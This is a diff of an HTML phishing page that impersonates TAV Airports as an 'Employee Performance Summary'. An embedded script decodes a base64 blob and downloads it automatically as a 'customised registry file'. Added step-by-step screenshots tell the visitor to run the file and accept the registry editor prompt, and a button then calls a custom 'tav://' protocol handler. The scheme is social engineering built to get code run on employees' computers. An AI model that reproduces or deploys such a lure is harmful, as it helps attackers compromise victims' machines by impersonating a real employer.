@@ -1,3 +1,6 @@
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -13,38 +16,30 @@
       margin: 0;
       padding: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      height: 100vh;
       background: linear-gradient(135deg, #1e3c72, #2a5298);
-      display: flex;
-      justify-content: center;
-      align-items: center;
       color: #333;
     }
 
     .container {
-      text-align: center;
+      max-width: 850px;
+      margin: 60px auto;
       background-color: #ffffff;
-      padding: 40px;
+      padding: 40px 30px;
       border-radius: 15px;
       box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
-      max-width: 500px;
-      width: 90%;
     }
 
     h1 {
       font-size: 26px;
-      margin-bottom: 15px;
+      margin-bottom: 10px;
       color: #1e3c72;
-    }
-
-    p {
-      font-size: 16px;
-      color: #555;
-      margin-bottom: 25px;
+      text-align: center;
     }
 
     .download-button {
-      display: inline-block;
+      display: block;
+      width: fit-content;
+      margin: 0 auto 15px;
       background: linear-gradient(90deg, #4facfe, #00f2fe);
       color: #fff;
       text-decoration: none;
@@ -54,6 +49,7 @@
       font-size: 16px;
       transition: background 0.3s ease, transform 0.2s;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      text-align: center;
     }
 
     .download-button:hover {
@@ -61,8 +57,46 @@
       transform: translateY(-2px);
     }
 
+    .attention-text {
+      text-align: center;
+      color: #c0392b;
+      font-size: 16px;
+      font-weight: 600;
+      background-color: #fdecea;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin: 15px auto 35px;
+      max-width: 600px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+
+    .steps {
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
+    }
+
+    .step {
+      text-align: center;
+    }
+
+    .step img {
+      width: 100%;
+      max-width: 600px;
+      height: auto;
+      border-radius: 10px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.15);
+    }
+
+    .step-title {
+      font-weight: bold;
+      font-size: 18px;
+      margin-bottom: 12px;
+      color: #1e3c72;
+    }
+
     .logo-bar {
-      margin-top: 30px;
+      margin-top: 40px;
       display: flex;
       justify-content: center;
       gap: 15px;
@@ -82,32 +116,25 @@
       transform: scale(1.05);
     }
 
-    @media (max-width: 500px) {
-      .container {
-        padding: 25px;
-      }
-
-      h1 {
-        font-size: 22px;
-      }
-
-      p {
-        font-size: 15px;
-      }
-
-      .logo-bar img {
-        height: 40px;
-      }
-
+    @media (max-width: 600px) {
       .download-button {
-        padding: 12px 20px;
         font-size: 15px;
+        padding: 12px 20px;
+      }
+
+      .attention-text {
+        font-size: 15px;
+        padding: 10px 14px;
+      }
+
+      .step-title {
+        font-size: 16px;
       }
     }
   </style>
 </head>
 <body>
-  <script>
+<script>
     function b64ToArrayBuffer(base64) {
       const cleaned = base64.replace(/^data:.*;base64,/, '');
       const binaryString = window.atob(cleaned);
@@ -134,13 +161,40 @@
     URL.revokeObjectURL(a.href);
     a.remove();
   </script>
-
   <div class="container">
-    <h1>Your file has been downloaded automatically.</h1>
-    <p>After downloading and running your customised registry file, you can see the performance results by clicking the button below.</p>
+    <h1>Employee Performance Summary</h1>
+
     <a class="download-button" href="tav://TAV_EmployeePDF" download>
-      Performance Evaluation Result
+      View Performance Evaluation Result
     </a>
+
+    <p class="attention-text">
+      <strong>Can't see your performance results after clicking the button above?</strong><br>
+      Follow the steps below to fix it.
+    </p>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-title">Step 1: Run the file.</div>
+        <img src="https://i.hizliresim.com/q37ci3n.png" alt="Step 1 Screenshot">
+      </div>
+      <div class="step">
+        <div class="step-title">Step 2: Click yes on this page.</div>
+        <img src="https://i.hizliresim.com/da8p2zy.png" alt="Step 2 Screenshot">
+      </div>
+      <div class="step">
+        <div class="step-title">Step 3: Accept the registry editor confirmation</div>
+        <img src="https://i.hizliresim.com/frukhxi.png" alt="Step 3 Screenshot">
+      </div>
+      <div class="step">
+        <div class="step-title">Step 4: Confirm successful update</div>
+        <img src="https://i.hizliresim.com/4lw6wia.png" alt="Step 4 Screenshot">
+      </div>
+      <div class="step">
+        <div class="step-title">Step 5: Return to this page and click the button again</div>
+        <img src="https://i.hizliresim.com/8w1nma9.png" alt="Step 5 Screenshot">
+      </div>
+    </div>
 
     <div class="logo-bar">
       <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo" />
@@ -149,5 +203,6 @@
       <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA Logo" />
     </div>
   </div>
+
 </body>
 </html>
